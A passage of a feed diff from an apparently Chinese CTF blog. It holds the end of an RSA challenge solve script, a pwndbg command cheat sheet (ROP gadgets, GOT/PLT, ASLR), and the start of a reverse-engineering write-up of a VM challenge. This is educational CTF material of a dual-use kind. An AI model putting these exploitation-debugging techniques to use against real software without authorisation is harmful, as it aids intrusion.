operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;173747400775037237499119138628710917207976935718394035613063219109153197713240288497094852951328821120301146137416392125632164384666157952079993477037237778043103278877799120982366215399159107746276881271883220494577745511406216675640773966244559596835970378099355485746784486359013819361014997811485589135463&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;q&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;131816585373639721213952582957741137275970828607414189698553233434142961482639192734668517311468596205692079539001403643395543816907261944034422413069781755026864643651448329100659792941632674865761952547883089120086825249692433942528976412805682521697534499714513072333159601382118300897685368738513700813533&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;e&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;65537&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;n&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;22902789087710692282201627723972920087676945775651369909558749681603601877066490004280829887082860024866325792922333359888979450409785852136285331867214311784932513053946349686873084098919921626735642656688483918867105990444133292660146552582773030563402978424369091489168537829677450378086515187008083500599611600232061376101775199885242634728744796816625633726726074004731386467983188726961022911791843528459801349329514692878947844318287016330210241002676592845651108656701768277324789376390295075009358573926461653230171198186299924562887630088294834319717425915382663997302617669638278141644149065887129240620779&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;d&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;19271863372140646463624718313226644858249851666842334809381515307252297674818586817615620577428910108660806391844117335212132837202625393102518076757881313639679468046843452495262065227324059965356828746942945552493466195508226172853946655099900580076597708945613657755972616318922476707819049590581423940789934387916037469210407055279325381173039093072419831193470910945428027164177392052950722125466565541460489747701257832749756103367996775905993293368370146016279539314698750416709668194421867922941773222876602958853233196249715041186342934713607756322667953880385223035641130659335671630397231173571336884350777&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;c &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;22383445933736798279478032679517743837766449187698865398822423786317612396771654040156586654564003392384975014045643201026069165276350584034120841617657486555798948939049343900381125798000000172357016404870066390095970211708364996514629691512019106870733929516372325207940525326467947232996619729431748024769431567208774806188872803942768881324395058229038610826245541466028073553184615680354118655959979504640632739098044460639023736294401801478667944983999124796530293982085703611284581213900570723479615642643430713949661089128106079384524944632103663244376051089098793845750645708721359256022997797080498949228931&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;pq &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; p&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;q&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;qp &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; q&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;p&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;phi&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;pq&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;qp&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;//&lt;/span&gt;n&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;d&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;inverse&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;e&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;phi&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;c&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;pow&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;c&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;d&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;n&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;long_to_bytes&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;c&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;当然，flag 没变哦，答案还是 “flag coming~”&lt;/p&gt;
+&lt;p&gt;豪丸，当然，碰到几个难题就老实了&lt;/p&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">https://0d0-1yp0.github.io/2024/12/20/CTF/binary/PWN/pwndbg%E7%94%A8%E6%B3%95%E5%9F%BA%E7%A1%80/</guid>
+            <title>pwndbg操作方式个人总结（一）</title>
+            <link>https://0d0-1yp0.github.io/2024/12/20/CTF/binary/PWN/pwndbg%E7%94%A8%E6%B3%95%E5%9F%BA%E7%A1%80/</link>
+            <category term="CTF" scheme="https://0d0-1yp0.github.io/categories/CTF/" />
+            <category term="二进制安全" scheme="https://0d0-1yp0.github.io/categories/CTF/binary/" />
+            <category term="二进制漏洞PWN" scheme="https://0d0-1yp0.github.io/categories/CTF/binary/PWN/" />
+            <category term="工具使用" scheme="https://0d0-1yp0.github.io/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/" />
+            <category term="二进制" scheme="https://0d0-1yp0.github.io/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/" />
+            <category term="CTF" scheme="https://0d0-1yp0.github.io/tags/CTF/" />
+            <category term="pwn" scheme="https://0d0-1yp0.github.io/tags/pwn/" />
+            <pubDate>Fri, 20 Dec 2024 00:00:00 +0800</pubDate>
+            <description><![CDATA[ &lt;h1 id=&#34;将-pwndbg-输出重定向到另一个终端tty&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#将-pwndbg-输出重定向到另一个终端tty&#34;&gt;#&lt;/a&gt; 将 pwndbg 输出重定向到另一个终端（TTY）：&lt;/h1&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;打开另一个终端&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;启动一个新的终端窗口或在当前终端中使用  &lt;code&gt;tmux&lt;/code&gt; 、 &lt;code&gt;screen&lt;/code&gt;  等工具分割出新的窗口。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;使用  &lt;code&gt;tty&lt;/code&gt;  命令获取该终端的设备文件路径。例如：&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;$ &lt;span class=&#34;token function&#34;&gt;tty&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;/dev/pts/1&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;在 pwndbg 中设置输出重定向&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;在 GDB（pwndbg）中输入以下命令，将上下文输出重定向到新的终端：&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-gdb&#34;&gt;set context-output /dev/pts/1
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;现在，pwndbg 的上下文信息（如  &lt;code&gt;context&lt;/code&gt;  命令的输出）将显示在  &lt;code&gt;/dev/pts/1&lt;/code&gt;  对应的终端中。&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;恢复默认设置（可选）&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;想将输出恢复到默认终端，可以使用：&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-gdb&#34;&gt;set context-output /dev/tty
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h1 id=&#34;pwndbg的基础操作&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#pwndbg的基础操作&#34;&gt;#&lt;/a&gt; pwndbg 的基础操作:&lt;/h1&gt;
+&lt;p&gt;附上一个佬的原文链接，写的真的很厉害 ovo 就不重复赘述了&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;原文链接：&lt;a href=&#34;https://blog.csdn.net/XiDPPython/article/details/142690569&#34;&gt;https://blog.csdn.net/XiDPPython/article/details/142690569&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h1 id=&#34;pwndbg-额外操作&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#pwndbg-额外操作&#34;&gt;#&lt;/a&gt; &lt;strong&gt;Pwndbg&lt;/strong&gt; 额外操作&lt;/h1&gt;
+&lt;p&gt;特别适用于逆向工程和漏洞利用。以下是一些常用的 pwndbg 命令及其用途：&lt;/p&gt;
+&lt;h3 id=&#34;常用命令&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常用命令&#34;&gt;#&lt;/a&gt; 常用命令：&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt; &lt;code&gt;context&lt;/code&gt; （或  &lt;code&gt;ctx&lt;/code&gt; ）&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;显示当前调试的上下文信息，包括寄存器、堆栈、代码和内存映射等。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;用法：&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;context&lt;/code&gt; ：显示默认的上下文信息。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;context code&lt;/code&gt; ：仅显示代码段的反汇编。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;context regs&lt;/code&gt; ：仅显示寄存器信息。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;context stack&lt;/code&gt; ：仅显示堆栈内容。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;context all&lt;/code&gt; ：显示所有可用的上下文信息。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt; &lt;code&gt;hexdump&lt;/code&gt; &lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;以十六进制形式显示内存内容。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;用法：&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;hexdump ADDRESS&lt;/code&gt; ：从指定地址开始显示内存内容。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt; &lt;code&gt;telescope&lt;/code&gt; &lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;类似于  &lt;code&gt;hexdump&lt;/code&gt; ，但提供更友好的内存查看方式，自动解析指针和字符串。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;用法：&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;telescope ADDRESS&lt;/code&gt; ：从指定地址开始显示内存内容。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt; &lt;code&gt;vmmap&lt;/code&gt; &lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;显示当前进程的内存映射信息。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;用法：&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;vmmap&lt;/code&gt; ：列出所有内存段及其权限。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt; &lt;code&gt;search&lt;/code&gt; &lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;在内存中搜索特定的字节序列或模式。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;用法：&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;search PATTERN&lt;/code&gt; ：搜索指定的模式。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt; &lt;code&gt;pie&lt;/code&gt; &lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;处理位置无关可执行文件（PIE）的相关命令。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;用法：&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;pie breakpoint OFFSET&lt;/code&gt; ：在偏移地址处设置断点。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt; &lt;code&gt;rop&lt;/code&gt; &lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;帮助查找 ROP（Return-Oriented Programming）小工具。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;用法：&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;rop&lt;/code&gt; ：列出可用的 ROP 小工具。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt; &lt;code&gt;got&lt;/code&gt;  和  &lt;code&gt;plt&lt;/code&gt; &lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;查看全局偏移量表（GOT）和过程链接表（PLT）。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;用法：&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;got&lt;/code&gt; ：显示 GOT 表信息。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;plt&lt;/code&gt; ：显示 PLT 表信息。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt; &lt;code&gt;aslr&lt;/code&gt; &lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;控制地址空间布局随机化（ASLR）。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;用法：&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;aslr on&lt;/code&gt; ：启用 ASLR。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;aslr off&lt;/code&gt; ：禁用 ASLR。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt; &lt;code&gt;elf-info&lt;/code&gt; &lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;显示当前可执行文件的 ELF 格式信息。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;用法：&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;elf-info&lt;/code&gt; ：显示 ELF 文件的段和节信息。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h1 id=&#34;pwndbg积累操作本人个人经常会用到的一些操作&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#pwndbg积累操作本人个人经常会用到的一些操作&#34;&gt;#&lt;/a&gt; pwndbg 积累操作 (本人个人经常会用到的一些操作)&lt;/h1&gt;
+&lt;h3 id=&#34;gdb-info-functions-win&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#gdb-info-functions-win&#34;&gt;#&lt;/a&gt; &lt;strong&gt;(&lt;strong&gt;gdb&lt;/strong&gt;)&lt;/strong&gt; &lt;strong&gt;info&lt;/strong&gt; &lt;strong&gt;functions&lt;/strong&gt; &lt;strong&gt;win&lt;/strong&gt;&lt;/h3&gt;
+&lt;p&gt;&lt;strong&gt;All&lt;/strong&gt; &lt;strong&gt;functions&lt;/strong&gt; &lt;strong&gt;matching&lt;/strong&gt; &lt;strong&gt;regular&lt;/strong&gt; &lt;strong&gt;expression&lt;/strong&gt; &lt;strong&gt;&amp;quot;win&amp;quot;&lt;/strong&gt;:  &lt;strong&gt;Non&lt;/strong&gt;-&lt;strong&gt;debugging&lt;/strong&gt; &lt;strong&gt;symbols:&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;0&lt;/strong&gt;x080484cb  &lt;strong&gt;win&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;还会更新&lt;/p&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">https://0d0-1yp0.github.io/2024/12/18/CTF/binary/RE/2020%E7%BD%91%E9%BC%8ERE/</guid>
+            <title>2020网鼎RE</title>
+            <link>https://0d0-1yp0.github.io/2024/12/18/CTF/binary/RE/2020%E7%BD%91%E9%BC%8ERE/</link>
+            <category term="CTF" scheme="https://0d0-1yp0.github.io/categories/CTF/" />
+            <category term="二进制安全" scheme="https://0d0-1yp0.github.io/categories/CTF/binary/" />
+            <category term="逆向工程reverse" scheme="https://0d0-1yp0.github.io/categories/CTF/binary/RE/" />
+            <category term="二进制" scheme="https://0d0-1yp0.github.io/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/" />
+            <category term="CTF" scheme="https://0d0-1yp0.github.io/tags/CTF/" />
+            <category term="逆向" scheme="https://0d0-1yp0.github.io/tags/%E9%80%86%E5%90%91/" />
+            <category term="网鼎杯" scheme="https://0d0-1yp0.github.io/tags/%E7%BD%91%E9%BC%8E%E6%9D%AF/" />
+            <pubDate>Wed, 18 Dec 2024 00:00:00 +0800</pubDate>
+            <description><![CDATA[ &lt;h1 id=&#34;还木写完先开个坑&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#还木写完先开个坑&#34;&gt;#&lt;/a&gt; 还木写完 ^^ 先开个坑&lt;/h1&gt;
+&lt;h3 id=&#34;代码分析&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#代码分析&#34;&gt;#&lt;/a&gt; &lt;strong&gt;代码分析：&lt;/strong&gt;&lt;/h3&gt;
+&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; __cdecl &lt;span class=&#34;token function&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; argc&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;argv&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;envp&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; v4&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;117&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// [esp+18h] [ebp-1D4h] BYREF&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token function&#34;&gt;__main&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token function&#34;&gt;qmemcpy&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;v4&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;unk_403040&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0x1C8u&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token function&#34;&gt;vm_operad&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;v4&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;114&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token function&#34;&gt;puts&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;good,The answer format is:flag &amp;#123;&amp;#125;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h4 id=&#34;逐行解释&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#逐行解释&#34;&gt;#&lt;/a&gt; &lt;strong&gt;逐行解释：&lt;/strong&gt;&lt;/h4&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;函数签名：&lt;/strong&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; __cdecl &lt;span class=&#34;token function&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; argc&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;argv&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;envp&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;ul&gt;
+&lt;li&gt;标准的  &lt;code&gt;main&lt;/code&gt;  函数入口。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;__cdecl&lt;/code&gt;  是调用约定，表示参数从右到左入栈，由调用者清理栈。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;变量声明：&lt;/strong&gt;&lt;/p&gt;
